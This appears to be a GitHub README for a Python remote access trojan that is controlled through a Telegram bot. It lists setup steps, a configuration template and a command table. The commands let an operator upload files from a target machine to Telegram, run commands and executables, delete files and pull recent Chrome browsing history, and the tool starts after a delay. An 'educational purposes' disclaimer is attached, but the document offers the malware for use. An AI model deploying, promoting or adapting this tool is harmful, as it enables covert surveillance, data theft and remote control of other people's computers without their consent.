RAT Downloader

RAT Downloader is a Python-based tool designed strictly for educational purposes.
It allows you to remotely interact with files on a target machine via Telegram.

⚠️ WARNING: This tool is intended strictly for educational purposes and authorized testing only.
You are solely responsible for any use of this software.
Do not use this on systems without explicit permission.
The author assumes no liability for misuse.


Features

Download and upload files

Browse directories

View Chrome browser history

Execute commands remotely

Flow Diagram
+-------------------+
|   User (Telegram) |
+---------+---------+
          |
          v
+-------------------+
|  Telegram Bot API |
+---------+---------+
          |
          v
+-------------------+
|   RAT Downloader  |
|   (main.py)       |
+-------------------+
          |
          v
+-------------------+
| Target Machine FS |
| Commands / Files  |
+-------------------+

Requirements

Python 3.8+

Telegram bot token

Telegram chat ID

Internet connection

Dependencies:

pip install -r requirements.txt


requirements.txt should include:

requests


config.py should contain:

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/"

Installation

Clone the repository:

git clone https://github.com/cmdkill3r/RAT-Downloader.git
cd RAT-Downloader


Install dependencies:

pip install -r requirements.txt


Configure your bot credentials in config.py.

Usage

Run the bot:

python main.py


⏱ After a ~5-minute boot delay, the bot will start.
Interact with it by sending commands via Telegram.

Commands
Command	Description
pwd	Show current working directory
ls	List files and folders
cd <dir>	Change directory
upload <file>	Upload file to Telegram
send <file>	Alias of upload
cp <src> <dst>	Copy file
mv <src> <dst>	Move or rename file
rm <file>	Delete file
mkdir <folder>	Create folder
run/exec <file>	Execute file
cat <file>	Show first 4k characters of a file
head <file> [n]	Show first n lines of a file
tail <file> [n]	Show last n lines of a file
history chrome	Retrieve last 12h of Chrome browser history
exit	Shut down bot
Files Included

main.py → Main bot script

config.py → Telegram bot configuration

requirements.txt → Python dependencies

GitHub

For updates, issues, and more tools: cmdkill3r
